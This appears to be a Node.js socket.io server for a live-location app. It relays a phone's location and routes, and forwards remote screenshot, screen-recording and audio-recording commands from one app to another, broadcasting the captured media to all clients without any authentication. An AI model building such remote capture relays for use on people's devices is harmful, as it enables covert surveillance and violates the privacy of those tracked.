// const express = require("express");
// const cors = require("cors");

// const fs = require("fs");
// const path = require("path");
// const http = require("http");
// const { Server } = require("socket.io");
// const axios = require("axios");
// const app = express();
// const server = http.createServer(app);
// const io = new Server(server);
// app.use(express.static('public'));

// app.use(
//   cors({
//     origin: "https://live-location-node-js-1.onrender.com/", // or '*' for all origins
//     methods: ["GET", "POST"],
//     credentials: true,
//   })
// );

// // Serve static files (HTML, CSS, JS) from the "public" folder
// app.use(express.static(path.join(__dirname, "public")));

// io.on("connection", (socket) => {
//   console.log("A user connected:", socket.id);

//   // Listen for location updates from the Flutter client
//   socket.on("locationUpdate", (data) => {
//     // console.log('Location update received from Flutter:', data); // Debug log
//     io.emit("locationUpdate", data);
//     console.log("Location update emitted to all clients"); // Debug log
//   });

//   // Listen for a request for route data
//   socket.on("requestRouteData", async (data1) => {
//     const { startLat, startLng, endLat, endLng } = data1; // Extract start and end points
//     // Check for undefined values
//     io.emit("requestRouteData", data1);
//     console.log("Start and end point emitted to front end"); // Debug log

//     // Assuming you are using Express.js
//     app.get("/api/getRoute", async (req, res) => {
//       try {
//         const response = await axios.get(
//           `https://router.project-osrm.org/route/v1/driving/${startLng},${startLat};${endLng},${endLat}`,
//           {
//             params: { geometries: "geojson", overview: false },
//           }
//         );

//         // Check if response is defined and has routes
//         if (response.data.routes && response.data.routes.length > 0) {
//           const route = response.data.routes[0];
//           console.log(route);
//           // Prepare the data to send to the frontend
//           const dataToSend = {
//             route: route,
//             waypoints: response.data.waypoints || [],
//           };

//           // Send the data to the frontend
//           return res.json(dataToSend);
//         } else {
//           console.error("No routes found in the response");
//           return res.status(404).json({ error: "No routes found" });
//         }
//       } catch (error) {
//         console.error("Error fetching the route:", error);
//         return res
//           .status(500)
//           .json({ error: "An error occurred while fetching the route" });
//       }
//     });
//   });
// });

// server.listen(3000, () => {
//   console.log("Server is running on port 3000");
// });


const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const http = require("http");
const { Server } = require("socket.io");
const axios = require("axios");
const app = express();
const server = http.createServer(app);
const io = new Server(server);
app.use(express.static("public"));

app.use(
  cors({
    origin: "https://live-location-node-js-1.onrender.com/", // or '*' for all origins
    methods: ["GET", "POST"],
    credentials: true,
  })
);

// Serve static files (HTML, CSS, JS) from the "public" folder
app.use(express.static(path.join(__dirname, "public")));

io.on("connection", (socket) => {
  console.log("A user connected:", socket.id);

  // Listen for location updates from the Flutter client
  socket.on("locationUpdate", (data) => {
    io.emit("locationUpdate", data);
    console.log("Location update emitted to all clients");
  });

  // Listen for route data requests
  socket.on("requestRouteData", async (data1) => {
    const { startLat, startLng, endLat, endLng } = data1;
    io.emit("requestRouteData", data1);
    console.log("Start and end point emitted to front end");

    // Get route data from the OSRM API
    app.get("/api/getRoute", async (req, res) => {
      try {
        const response = await axios.get(
          `https://router.project-osrm.org/route/v1/driving/${startLng},${startLat};${endLng},${endLat}`,
          {
            params: { geometries: "geojson", overview: false },
          }
        );

        if (response.data.routes && response.data.routes.length > 0) {
          const route = response.data.routes[0];
          const dataToSend = {
            route: route,
            waypoints: response.data.waypoints || [],
          };

          return res.json(dataToSend);
        } else {
          return res.status(404).json({ error: "No routes found" });
        }
      } catch (error) {
        return res.status(500).json({ error: "Error fetching the route" });
      }
    });
  });

  // Command handling: Receive media commands (e.g., screenshot, screen record, audio record)
  socket.on("mediaCommand", (command) => {
    // Emit the command to the first app
    io.emit("executeMediaCommand", command);
    console.log(`Command received: ${command}`);
  });

  // Handle media data coming from the first app
  socket.on("mediaData", (mediaData) => {
    // Send the media data to the second app
    io.emit("mediaData", mediaData);
    console.log("Media data sent to all clients");
  });

  // Clean up when a user disconnects
  socket.on("disconnect", () => {
    console.log("A user disconnected:", socket.id);
  });
});

// Start the server
server.listen(3000, () => {
  console.log("Server is running on port 3000");
});
